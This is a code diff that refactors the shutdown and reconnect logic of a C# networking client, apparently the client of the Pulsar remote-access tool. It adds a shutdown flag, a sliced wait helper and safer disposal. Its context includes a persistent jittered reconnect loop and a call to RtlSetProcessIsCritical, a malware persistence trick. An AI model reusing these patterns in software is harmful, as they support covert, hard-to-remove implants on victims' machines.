@@ -51,6 +51,16 @@ namespace Pulsar.Client.Networking
         /// </summary>
         private readonly CancellationToken _token;
 
+    /// <summary>
+    /// Indicates that shutdown was requested for the connect loop.
+    /// </summary>
+    private volatile bool _shutdownRequested;
+
+    /// <summary>
+    /// Tracks whether the instance was disposed to avoid double cleanup.
+    /// </summary>
+    private bool _disposed;
+
         /// <summary>
         /// Initializes a new instance of the <see cref="PulsarClient"/> class.
         /// </summary>
@@ -73,7 +83,7 @@ namespace Pulsar.Client.Networking
         /// </summary>
         public void ConnectLoop()
         {
-            while (!_token.IsCancellationRequested)
+            while (!_shutdownRequested && !_token.IsCancellationRequested)
             {
                 if (!Connected)
                 {
@@ -115,29 +125,24 @@ namespace Pulsar.Client.Networking
 
                 while (Connected)
                 {
-                    try
-                    {
-                        _token.WaitHandle.WaitOne(1000);
-                    }
-                    catch (NullReferenceException)
-                    {
-                        Disconnect();
-                        return;
-                    }
-                    catch (ObjectDisposedException)
+                    if (WaitForShutdownSignal(1000))
                     {
                         Disconnect();
                         return;
                     }
                 }
 
-                if (_token.IsCancellationRequested)
+                if (_shutdownRequested || _token.IsCancellationRequested)
                 {
                     Disconnect();
                     return;
                 }
 
-                Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
+                if (WaitForShutdownSignal(Settings.RECONNECTDELAY + _random.Next(250, 750)))
+                {
+                    Disconnect();
+                    return;
+                }
             }
         }
 
@@ -241,17 +246,51 @@ namespace Pulsar.Client.Networking
                 NativeMethods.RtlSetProcessIsCritical(0, 0, 0);
             }
 
+            _shutdownRequested = true;
             _tokenSource.Cancel();
             Disconnect();
         }
 
         protected override void Dispose(bool disposing)
         {
-            if (disposing)
+            if (!disposing || _disposed)
             {
-                _tokenSource.Cancel();
+                return;
+            }
+
+            _shutdownRequested = true;
+            _disposed = true;
+
+            _tokenSource.Cancel();
+
+            try
+            {
+                base.Dispose(disposing);
+            }
+            finally
+            {
                 _tokenSource.Dispose();
             }
+        }
+
+        /// <summary>
+        /// Waits for either a shutdown request/cancellation or until the specified timeout elapses.
+        /// </summary>
+        /// <param name="timeoutMs">Timeout in milliseconds.</param>
+        /// <returns><c>true</c> if shutdown was requested; otherwise <c>false</c>.</returns>
+        private bool WaitForShutdownSignal(int timeoutMs)
+        {
+            const int slice = 100;
+            var waited = 0;
+
+            while (waited < timeoutMs && !_shutdownRequested && !_token.IsCancellationRequested)
+            {
+                var delay = Math.Min(slice, timeoutMs - waited);
+                Thread.Sleep(delay);
+                waited += delay;
+            }
+
+            return _shutdownRequested || _token.IsCancellationRequested;
         }
     }
 }
